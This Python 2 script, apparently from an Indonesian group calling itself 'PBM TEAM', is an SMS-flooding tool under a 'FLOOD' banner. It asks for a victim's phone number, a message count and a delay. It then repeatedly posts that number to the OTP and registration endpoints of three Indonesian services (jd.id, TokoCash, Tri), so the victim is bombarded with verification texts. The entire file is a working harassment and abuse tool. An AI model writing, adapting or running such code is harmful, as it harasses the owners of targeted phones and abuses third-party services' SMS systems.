import requests
import time
import os
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
def banner():
    os.system("clear")
    print R+" ______ _      ___________  _____  "+W
    print B+"|  ____| |    / __ \ / __ \|  __ \ "+W+R+"\tJaka"+W+" Taruna"+W
    print G+"| |__  | |   | |  | | |  | | |  | |"+W+O+" --[ PBM TEAM ]--"+W
    print P+"|  __| | |   | |  | | |  | | |  | |"+W+C+" SMS V.0.1 Beta"+W
    print C+"| |    | |___| |__| | |__| | |__| |"+W+O+" Thanks to "+R+"Qiuby"+W+" Zhukhi"+W
    print W+"|_|    |______\____/ \____/|_____/ "+W
    print ""
def post_data():
    data = {"jdid":["http://sc.jd.id/phone/sendPhoneSms",
           {"phone":no.replace("+62","0"), "smsType":"1"}],        
            "tokoCash":["https://www.tokocash.com/oauth/otp",
           {"msisdn": no, "accept":"sms"}],
           "SMS-TRI":["https://registrasi.tri.co.id/daftar/generateOTP", {"msisdn":no}]
           }
    return data
def start(qz,h,u,m):
    r = requests.session()
    for i in range(int(h)): 
        for judul, (url,datas) in qz.items():
            print G+"----TEST %s-----" % (judul+W)
            print C+"Send To No: %s" % (u+W)
            respon = r.post(url, datas, headers=None).text
            print respon
            time.sleep(int(m))
if __name__ == "__main__":
    banner()
    print "[?] Contoh Phone Number: +628********** [?]"
    no = raw_input(C+"[!] Phone Number: "+W)
    print "[?] Jumlah Pesan [?]"
    count = raw_input(C+"[!] Count: "+W)
    print "[?] DELAY PENGIRIMAN [?]"
    delay = raw_input(C+"[!] Delay (Detik): "+W)
    if delay == '':
        delay = 1
    post_data = post_data()
    start(post_data, count, no, delay)
